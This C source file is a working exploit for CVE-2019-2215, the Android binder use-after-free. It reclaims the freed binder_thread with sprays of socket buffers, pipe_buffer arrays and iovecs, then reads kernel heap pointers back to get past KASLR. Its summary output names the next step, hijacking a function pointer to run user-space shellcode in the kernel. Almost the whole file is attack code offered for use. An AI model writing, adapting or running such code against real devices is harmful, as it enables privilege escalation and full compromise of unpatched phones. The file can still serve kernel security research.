/*
 * skb_spray_leak.c — Leak kernel heap addr via CVE-2019-2215 + Unix socket skb
 *
 * Since System V IPC (msg_msg) is unavailable on this kernel, we use
 * Unix socket sk_buff data as the spray + readback primitive.
 *
 * When sendmsg sends data over a Unix stream socket, the kernel allocates
 * an sk_buff with a data area from kmalloc. For 128 bytes of data:
 *   kmalloc size = SKB_DATA_ALIGN(128) + SKB_DATA_ALIGN(sizeof(skb_shared_info))
 *                = 128 + ~320 = ~448 bytes → kmalloc-512
 *   This matches binder_thread (304 bytes → kmalloc-512)!
 *
 * Our user data starts at offset 0 in the kmalloc allocation.
 * The wait_queue corruption writes kernel pointers to offsets 0x50 and 0x58.
 * Both fall within our 128-byte data, so recvmsg reads them back!
 *
 * Flow:
 *   1. socketpair() — Unix stream socket pair
 *   2. Open binder, epoll_ctl(ADD) — registers wait queue entry
 *   3. BINDER_THREAD_EXIT — frees binder_thread (UAF)
 *   4. Send many 128-byte messages — skb data sprays kmalloc-512
 *   5. EPOLL_CTL_DEL — list_del writes kernel ptrs to offsets 0x50, 0x58
 *   6. recvmsg — reads back corrupted data with kernel pointers!
 *
 * Compile: gcc -static -O2 -o skb_spray_leak skb_spray_leak.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdint.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)

/* Spray parameters */
#define SKB_DATA_SZ     128   /* User data per message */
#define SPRAY_COUNT     256   /* Number of messages to spray */

/* Where list_del writes kernel pointers (in the kmalloc allocation) */
#define CORRUPT_OFF_NEXT 0x50  /* wait.task_list.next → self-ref kernel ptr */
#define CORRUPT_OFF_PREV 0x58  /* wait.task_list.prev → self-ref kernel ptr */

/* Spinlock at offset 0x48 must be zero for list_del to work */
#define SPINLOCK_OFF     0x48

static int is_kptr(uint64_t val) {
    return (val >= 0xffffffc000000000ULL && val <= 0xffffffffffffffffULL);
}

static volatile int got_signal = 0;
static void sig_handler(int sig) { got_signal = sig; }

/*
 * Attempt 1: Simple single-epoll with skb spray
 */
static int attempt_skb_leak(int attempt_num, uint64_t *leaked) {
    int result = -1;
    int sv[2] = {-1, -1};
    int bfd = -1;
    int epfd = -1;

    /* Unix socket pair for spray + readback */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        printf("    socketpair failed: %s\n", strerror(errno));
        return -1;
    }

    /* Make receive non-blocking */
    fcntl(sv[1], F_SETFL, O_NONBLOCK);

    /* Set large send/recv buffer to hold all spray messages */
    int bufsz = SPRAY_COUNT * SKB_DATA_SZ * 2;
    setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &bufsz, sizeof(bufsz));
    setsockopt(sv[1], SOL_SOCKET, SO_RCVBUF, &bufsz, sizeof(bufsz));

    /* Open binder */
    bfd = open("/dev/binder", O_RDWR);
    if (bfd < 0) {
        printf("    binder open failed\n");
        goto cleanup;
    }

    /* mmap binder (required) */
    void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) {
        printf("    binder mmap failed\n");
        goto cleanup;
    }

    /* Create epoll watching binder */
    epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev) < 0) {
        printf("    epoll_ctl ADD failed\n");
        munmap(bmap, 4096);
        goto cleanup;
    }

    /* Free binder_thread (UAF!) */
    if (ioctl(bfd, BINDER_THREAD_EXIT, NULL) < 0) {
        printf("    THREAD_EXIT failed\n");
        munmap(bmap, 4096);
        goto cleanup;
    }

    /* Spray: send many messages over the socket.
     * Each send allocates an skb with data in kmalloc-512.
     * One should reclaim the freed binder_thread's slab slot. */
    char spray_buf[SKB_DATA_SZ];
    int spray_ok = 0;
    int i;
    for (i = 0; i < SPRAY_COUNT; i++) {
        /* Fill with marker so we can identify our data */
        memset(spray_buf, 0, sizeof(spray_buf));
        uint32_t marker = 0xDEAD0000 | (attempt_num << 8) | i;
        memcpy(spray_buf, &marker, 4);
        /* Ensure spinlock area is zero (offset 0x48 in kmalloc = byte 72 in our data) */
        /* Our data is at offset 0 in kmalloc, so spinlock is at data byte 0x48 */
        memset(spray_buf + SPINLOCK_OFF, 0, 8);

        ssize_t sent = send(sv[0], spray_buf, sizeof(spray_buf), MSG_DONTWAIT);
        if (sent < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) break;
            break;
        }
        spray_ok++;
    }

    if (spray_ok < 10) {
        printf("    Only sprayed %d messages (need more)\n", spray_ok);
        munmap(bmap, 4096);
        goto cleanup;
    }

    /* Trigger list_del via EPOLL_CTL_DEL */
    errno = 0;
    int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
    if (del_ret < 0 && errno != 0) {
        printf("    EPOLL_CTL_DEL failed: %s\n", strerror(errno));
    }

    if (got_signal) {
        printf("    *** SIGNAL %d during corruption! ***\n", got_signal);
        munmap(bmap, 4096);
        goto cleanup;
    }

    /* Read back all messages and check for kernel pointers */
    char recv_buf[SKB_DATA_SZ];
    int recv_count = 0;
    int found = 0;

    for (i = 0; i < spray_ok + 10; i++) {
        ssize_t n = recv(sv[1], recv_buf, sizeof(recv_buf), MSG_DONTWAIT);
        if (n <= 0) break;
        recv_count++;

        if ((size_t)n < CORRUPT_OFF_PREV + 8) continue;

        /* Check for kernel pointers at corruption offsets */
        uint64_t val_next, val_prev;
        memcpy(&val_next, recv_buf + CORRUPT_OFF_NEXT, 8);
        memcpy(&val_prev, recv_buf + CORRUPT_OFF_PREV, 8);

        if (is_kptr(val_next) || is_kptr(val_prev)) {
            printf("    *** KERNEL POINTER in msg #%d! ***\n", i);
            printf("      +0x%02x: 0x%016llx %s\n", CORRUPT_OFF_NEXT,
                   (unsigned long long)val_next,
                   is_kptr(val_next) ? "KPTR!" : "");
            printf("      +0x%02x: 0x%016llx %s\n", CORRUPT_OFF_PREV,
                   (unsigned long long)val_prev,
                   is_kptr(val_prev) ? "KPTR!" : "");

            /* Full hex dump of corrupted message */
            printf("      Full data:\n");
            int row;
            for (row = 0; row < SKB_DATA_SZ; row += 16) {
                printf("        %02x: ", row);
                int col;
                for (col = 0; col < 16 && row + col < (int)n; col++) {
                    printf("%02x ", (unsigned char)recv_buf[row + col]);
                }
                printf("\n");
            }

            if (is_kptr(val_next)) { *leaked = val_next; found = 1; }
            else if (is_kptr(val_prev)) { *leaked = val_prev; found = 1; }
        }

        /* Also scan ALL bytes for unexpected kernel pointers */
        if (!found && n >= 8) {
            uint64_t *scan = (uint64_t *)recv_buf;
            int j;
            for (j = 0; j < (int)(n / 8); j++) {
                if (is_kptr(scan[j])) {
                    printf("    KPTR at msg#%d offset %d: 0x%016llx\n",
                           i, j * 8, (unsigned long long)scan[j]);
                    *leaked = scan[j];
                    found = 1;
                }
            }
        }
    }

    printf("    Sprayed: %d, Received: %d, Leaked: %s\n",
           spray_ok, recv_count, found ? "YES" : "no");

    if (found) result = 0;

    munmap(bmap, 4096);

cleanup:
    if (epfd >= 0) close(epfd);
    if (bfd >= 0) close(bfd);
    if (sv[0] >= 0) close(sv[0]);
    if (sv[1] >= 0) close(sv[1]);

    return result;
}

/*
 * Attempt 2: Use pipe spray instead of socket
 * pipe_buffer array with 8 buffers = 8 * 40 = 320 bytes → kmalloc-512
 */
static int attempt_pipe_spray_leak(uint64_t *leaked) {
    printf("\n  === Pipe Buffer Array Spray ===\n");

    int bfd = open("/dev/binder", O_RDWR);
    if (bfd < 0) return -1;

    void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) { close(bfd); return -1; }

    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* Free binder_thread */
    ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    printf("    binder_thread freed\n");

    /* Spray with pipe_buffer arrays via F_SETPIPE_SZ
     * 8 pages → 8 pipe_buffers → 320 bytes → kmalloc-512 */
    #define PIPE_SPRAY_COUNT 128
    int pipes[PIPE_SPRAY_COUNT][2];
    int pipe_ok = 0;
    int i;
    for (i = 0; i < PIPE_SPRAY_COUNT; i++) {
        if (pipe(pipes[i]) < 0) break;
        /* Resize to 8 pages — this reallocates the pipe_buffer array */
        int new_sz = fcntl(pipes[i][0], F_SETPIPE_SZ, 8 * 4096);
        if (new_sz < 0) {
            close(pipes[i][0]);
            close(pipes[i][1]);
            break;
        }
        /* Write some data to populate pipe_buffer entries */
        char data[64];
        memset(data, 0x42 + (i % 26), sizeof(data));
        write(pipes[i][1], data, sizeof(data));
        pipe_ok++;
    }
    printf("    Sprayed %d pipe_buffer arrays\n", pipe_ok);

    /* Trigger corruption */
    errno = 0;
    epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
    printf("    EPOLL_CTL_DEL done (errno=%d)\n", errno);

    /* Read back pipe data to see if anything leaked
     * The pipe_buffer.page at offset 0x50 may be corrupted to a kernel addr
     * If we read from the pipe, the kernel uses pipe_buffer.page to find data.
     * A corrupted page pointer would cause either:
     * - Kernel to read from wrong memory (possible leak)
     * - Crash (if the pointer is invalid) */
    printf("    Reading back pipe data...\n");
    int found = 0;
    for (i = 0; i < pipe_ok; i++) {
        char rbuf[128];
        memset(rbuf, 0, sizeof(rbuf));
        errno = 0;
        ssize_t n = read(pipes[i][0], rbuf, sizeof(rbuf));
        if (n > 0) {
            /* Check for unexpected data (not our 0x42+ pattern) */
            int unexpected = 0;
            int j;
            for (j = 0; j < (int)n; j++) {
                if (rbuf[j] != (char)(0x42 + (i % 26))) {
                    unexpected++;
                }
            }
            if (unexpected > 0) {
                printf("    pipe#%d: %d unexpected bytes (of %zd)!\n",
                       i, unexpected, n);
                /* Scan for kernel pointers */
                uint64_t *scan = (uint64_t *)rbuf;
                for (j = 0; j < (int)(n / 8); j++) {
                    if (is_kptr(scan[j])) {
                        printf("    *** KPTR in pipe#%d: 0x%016llx ***\n",
                               i, (unsigned long long)scan[j]);
                        *leaked = scan[j];
                        found = 1;
                    }
                }
            }
        } else if (n < 0 && errno == EFAULT) {
            printf("    pipe#%d: EFAULT! (corrupted page pointer!)\n", i);
        }
    }

    /* Cleanup */
    for (i = 0; i < pipe_ok; i++) {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
    close(epfd);
    munmap(bmap, 4096);
    close(bfd);

    return found ? 0 : -1;
}

/*
 * Attempt 3: Use iovec spray (P0 technique) + writev return value analysis
 * Even though we can't read kernel memory via writev (access_ok blocks it),
 * we can still detect WHEN the iovec was corrupted by observing writev behavior.
 * And we can read the binder mmap for an independent kernel heap pointer.
 */
static int attempt_iovec_writev_analysis(uint64_t *kptr_from_binder) {
    printf("\n  === Iovec/Writev Behavioral Analysis ===\n");

    int bfd = open("/dev/binder", O_RDWR);
    if (bfd < 0) return -1;

    void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
    if (bmap == MAP_FAILED) { close(bfd); return -1; }

    /* Read kernel pointer from binder mmap (our KASLR bypass) */
    uint64_t binder_kptr = ((uint64_t *)bmap)[0];
    printf("    Binder mmap kptr: 0x%016llx\n", (unsigned long long)binder_kptr);
    if (is_kptr(binder_kptr)) {
        *kptr_from_binder = binder_kptr;
        printf("    -> Valid kernel heap pointer from binder mmap!\n");
    }

    /* Set up the iovec array matching binder_thread size
     * 304 bytes / 16 = 19 iovecs */
    #define IOVEC_COUNT 19
    #define WQ_IOV_IDX  5  /* WAITQUEUE_OFFSET 0x48 / 16 = 4.5, task_list at 0x50 → iov[5] */

    struct iovec iovs[IOVEC_COUNT];
    memset(iovs, 0, sizeof(iovs));

    /* Set up a user page at 4GB boundary for the spinlock trick */
    void *dummy = mmap((void *)0x100000000ULL, 0x2000,
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (dummy == MAP_FAILED || dummy != (void *)0x100000000ULL) {
        printf("    mmap 4G failed (dummy=%p)\n", dummy);
        /* Try without the 4G alignment trick */
        dummy = mmap(NULL, 0x2000, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (dummy == MAP_FAILED) {
            printf("    mmap fallback failed\n");
            munmap(bmap, 4096);
            close(bfd);
            return -1;
        }
    }
    memset(dummy, 0, 0x2000);
    printf("    Dummy page at %p\n", dummy);

    /* Fill iovecs:
     * iov[0-4]: small valid writes (write known data)
     * iov[5]: this is where corruption will happen
     *   iov_base at offset 0x50 → will become self-ref kernel ptr if single-epoll
     *   iov_len at offset 0x58 → will become self-ref kernel ptr if single-epoll
     *
     * For the spinlock at offset 0x48 (overlaps iov[4].iov_len):
     *   Need iov[4].iov_len's lower 32 bits to be zero.
     *   Set iov[4].iov_len = 0. */
    char user_bufs[IOVEC_COUNT][64];
    int j;
    for (j = 0; j < IOVEC_COUNT; j++) {
        memset(user_bufs[j], 'A' + j, 64);
    }

    for (j = 0; j < IOVEC_COUNT; j++) {
        iovs[j].iov_base = user_bufs[j];
        iovs[j].iov_len = 32;
    }
    /* iov[4].iov_len = 0 (spinlock must be zero) */
    iovs[4].iov_len = 0;
    /* iov[5] — this overlaps the task_list. Set to known values. */
    iovs[5].iov_base = dummy;      /* at offset 0x50 — will be list_head.next */
    iovs[5].iov_len = 0x1000;      /* at offset 0x58 — will be list_head.prev */

    /* Create pipe */
    int pfd[2];
    if (pipe(pfd) < 0) {
        printf("    pipe failed\n");
        munmap(bmap, 4096);
        close(bfd);
        return -1;
    }

    /* Create epoll */
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    /* Free thread */
    ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    printf("    Thread freed, starting writev...\n");

    /* writev — the iovec array copy goes into kmalloc-512, reclaiming freed thread */
    errno = 0;
    ssize_t written = writev(pfd[1], iovs, IOVEC_COUNT);
    printf("    writev returned: %zd (errno=%d)\n", written, errno);

    /* The writev return tells us:
     * - If corruption happened, iov[5] has kernel addresses
     * - writev with iov[5].iov_base = kernel addr → EFAULT → partial write
     * - partial write = sum of iovs[0-3] (iov[4].len=0, so skipped)
     * Expected without corruption: 32*4 + 0 + 0x1000 + 32*13 = 128+4096+416 = 4640
     * Expected with corruption: 32*4 = 128 (stops at corrupted iov[5]) */
    int expected_no_corrupt = 0;
    for (j = 0; j < IOVEC_COUNT; j++) {
        expected_no_corrupt += iovs[j].iov_len;
    }
    printf("    Expected (no corruption): %d\n", expected_no_corrupt);
    printf("    Expected (corruption at iov[5]): ~128 (iovs 0-3 only)\n");

    if (written > 0 && written < expected_no_corrupt) {
        printf("    *** PARTIAL WRITE! Corruption likely occurred ***\n");
        printf("    Stopped after %zd bytes (iovs 0-%d completed)\n",
               written, (int)(written / 32) - 1);
    }

    /* Now do the EPOLL_CTL_DEL explicitly (may have already happened via writev) */
    epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);

    /* Read what's in the pipe */
    if (written > 0) {
        char *pipe_data = malloc(written + 16);
        ssize_t n = read(pfd[0], pipe_data, written);
        printf("    Read %zd bytes from pipe\n", n);
        /* Check for kernel pointers in pipe data */
        if (n >= 8) {
            uint64_t *scan = (uint64_t *)pipe_data;
            int k;
            for (k = 0; k < (int)(n / 8); k++) {
                if (is_kptr(scan[k])) {
                    printf("    *** KPTR in pipe at offset %d: 0x%016llx ***\n",
                           k * 8, (unsigned long long)scan[k]);
                }
            }
        }
        free(pipe_data);
    }

    close(pfd[0]);
    close(pfd[1]);
    close(epfd);
    munmap(bmap, 4096);
    close(bfd);

    return is_kptr(binder_kptr) ? 0 : -1;
}

int main(void) {
    printf("=== SKB SPRAY KERNEL LEAK — CVE-2019-2215 ===\n");
    printf("uid=%u gid=%u\n", getuid(), getgid());

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sig_handler;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    /* Kernel info */
    {
        char buf[256];
        int fd = open("/proc/version", O_RDONLY);
        if (fd >= 0) {
            int n = read(fd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s", buf); }
            close(fd);
        }
    }

    /* Phase 1: Socket skb spray */
    printf("\n=== Phase 1: Socket SKB Spray (multiple attempts) ===\n");
    uint64_t leaked_skb = 0;
    int skb_ok = 0;
    int attempt;
    for (attempt = 0; attempt < 5; attempt++) {
        printf("  Attempt %d:\n", attempt);
        if (attempt_skb_leak(attempt, &leaked_skb) == 0) {
            printf("  -> LEAKED on attempt %d!\n", attempt);
            skb_ok = 1;
            break;
        }
        usleep(100000);  /* Brief pause between attempts */
    }

    /* Phase 2: Pipe buffer array spray */
    uint64_t leaked_pipe = 0;
    int pipe_ok = attempt_pipe_spray_leak(&leaked_pipe);

    /* Phase 3: Iovec/writev behavioral analysis + binder mmap kptr */
    uint64_t binder_kptr = 0;
    int iov_ok = attempt_iovec_writev_analysis(&binder_kptr);

    /* Summary */
    printf("\n=== LEAK SUMMARY ===\n");
    printf("  Socket skb spray:  %s", skb_ok ? "SUCCESS" : "FAILED");
    if (skb_ok) printf(" (0x%016llx)", (unsigned long long)leaked_skb);
    printf("\n");

    printf("  Pipe buffer spray: %s", pipe_ok == 0 ? "SUCCESS" : "FAILED");
    if (pipe_ok == 0) printf(" (0x%016llx)", (unsigned long long)leaked_pipe);
    printf("\n");

    printf("  Binder mmap kptr:  %s", is_kptr(binder_kptr) ? "AVAILABLE" : "NONE");
    if (is_kptr(binder_kptr)) printf(" (0x%016llx)", (unsigned long long)binder_kptr);
    printf("\n");

    if (skb_ok || pipe_ok == 0 || is_kptr(binder_kptr)) {
        printf("\n  *** KERNEL HEAP ADDRESS AVAILABLE ***\n");
        printf("  Exploitation path: func ptr hijack via fake wait_queue_t\n");
        printf("  No PAN/PXN → kernel can exec user-space shellcode\n");
    }

    printf("\n=== DONE ===\n");
    return 0;
}
